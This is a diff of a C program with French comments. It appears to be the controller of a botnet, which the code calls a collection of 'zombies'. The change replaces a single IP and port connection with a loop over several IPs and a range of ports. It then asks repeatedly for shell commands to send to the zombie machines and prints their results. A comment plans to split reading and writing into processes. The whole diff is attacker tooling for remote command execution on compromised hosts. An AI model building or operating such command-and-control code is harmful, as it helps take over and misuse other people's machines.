@@ -36,34 +36,56 @@ int createConnection(char * ip, int port) {
 }
 
 int main(int argc, char **argv) {
-    if (argc < 3) {
-        printf("IP || PORT -> missing ");
-        return 1;
-    }
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int sock = createConnection(ip, port);
-    if (sock < 0) {
-        printf("Impossible de créer une connexion\n");
+   if (argc < 2) {
+        printf("ip -> missing");
         return 1;
     }
 
-    // verif du port 
-    struct sockaddr_in addr;
-    socklen_t addr_len = sizeof(addr);
-    getpeername(sock, (struct sockaddr *)&addr, &addr_len);
-    int connectedPort = ntohs(addr.sin_port);
+    char **ips = &argv[1]; 
 
-    if(connectedPort != port){
-        printf("\n ce n'est pas le meme port que le zombie \n");
-        close(sock);
-        return 1;
+    int sock = -1;
+    int connectedPort = -1;
 
+    for (int i = 0; ips[i] != NULL; i++) {
+     for (int port = MIN_PORT; port <= MAX_PORT; port++) {
+        sock = createConnection(ips[i], port);
+
+        if (sock < 0) {
+            continue; 
+        }
+        
+        struct sockaddr_in addr;
+        socklen_t addr_len = sizeof(addr);
+        getpeername(sock, (struct sockaddr *)&addr, &addr_len);
+        connectedPort = ntohs(addr.sin_port);
+
+        if (connectedPort != port) {
+            close(sock);
+            continue; 
+        }
+
+        printf("Connexion établie avec %s:%d\n", ips[i], port);
+
+        break;
     }
+
+    if (sock >= 0) {
+        break; 
+    }
+}
+
 
     //printf("port du zombie = %d ",connectedPort);
 
-    printf("Connexion établie avec %s:%d\n", ip, port);
+
+/*
+
+Faut 2 processus un de lecture et un d'ecriture, separer le write et read en 
+2 processus.
+
+Utilisation des poll (asynchrone).
+
+*/
    char buffer[BUF_SIZE];
     while (1) {
         printf("Entrez votre commande a envoyer aux zombies: ");
@@ -89,6 +111,7 @@ int main(int argc, char **argv) {
 
         printf("Reponse de la commande executé =   \n %s",buffer);
     }
+
     close(sock);
     return 0;
 }
